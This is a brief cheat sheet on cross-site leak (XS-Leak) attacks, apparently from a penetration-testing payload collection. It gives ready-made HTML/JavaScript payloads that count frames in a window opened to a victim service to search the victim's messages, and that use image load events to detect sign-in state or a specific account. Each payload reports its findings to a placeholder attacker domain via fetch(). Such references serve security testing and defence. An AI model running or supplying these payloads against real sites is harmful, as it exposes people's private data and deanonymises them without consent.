# XS-Leaks (Cross-Site Leaks)

## Table of Contents

- [Information Disclosure](#information-disclosure)
- [Deanonymization](#deanonymization)

## Information Disclosure

### Whether a page differs depending on the victim's private data can be measured from another site, revealing that data one guess at a time. [^1]

- Searching the victim's messages by counting frames
    ```html
    <button id="start">Continue</button>
    <script>
        document.getElementById('start').onclick = () => {
            const w = window.open('https://[VULNERABLE-SERVICE]/messages/search?q=invoice');

            setTimeout(() => {
                // window.length is readable across origins and counts the frames on the page
                fetch(`https://[ATTACKER-DOMAIN]/?frames=${w.length}`);
                w.close();
            }, 3000);
        };
    </script>
    ```
    When the result page embeds a frame only if a message matches, the frame count tells the attacker whether the victim has a message containing the term. Repeating the search with other terms reveals more of the victim's data.

## Deanonymization

### Whether the visitor is signed in to a service, or which account they hold, can be determined from another site. [^2]

- Detecting whether the visitor is signed in
    ```html
    <img src="https://[VULNERABLE-SERVICE]/me/avatar" onload="fetch('https://[ATTACKER-DOMAIN]/?signed_in=1')" onerror="fetch('https://[ATTACKER-DOMAIN]/?signed_in=0')">
    ```
    The endpoint returns an image to signed-in users and redirects others to an HTML sign-in page, which fails to load as an image.

- Identifying a specific account
    ```html
    <img src="https://[VULNERABLE-SERVICE]/files/[FILE-SHARED-ONLY-WITH-TARGET]/thumbnail" onload="fetch('https://[ATTACKER-DOMAIN]/?is_target=1')">
    ```
    The attacker shares a file with the target account only. Its thumbnail loads for that account alone, so a successful load identifies the visitor.
    - XS-Leaks Wiki, [XS-Leaks Wiki](https://xsleaks.dev/)

[^1]: Applies when the result page's number of frames depends on the result, and the page does not set a `Cross-Origin-Opener-Policy`, which would sever the reference returned by `window.open`.
[^2]: Applies when the session cookie is set with `SameSite=None` and the browser does not block or partition third-party cookies.
